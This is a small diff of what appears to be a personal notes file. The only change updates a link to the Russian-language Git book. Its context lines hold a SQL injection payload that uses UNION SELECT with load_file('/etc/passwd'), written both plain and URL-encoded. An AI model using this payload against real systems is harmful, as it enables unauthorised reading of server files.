@@ -25,4 +25,4 @@ union select null,null, load_file('/etc/passwd') -- -
 6%20union%20select%20null%2cnull%2c%20load_file('/etc/passwd')%20--%20-
 
 книга по git:
-https://git-scm.com/book/ru/v2/
+https://git-scm.com/book/ru/v2/other_link
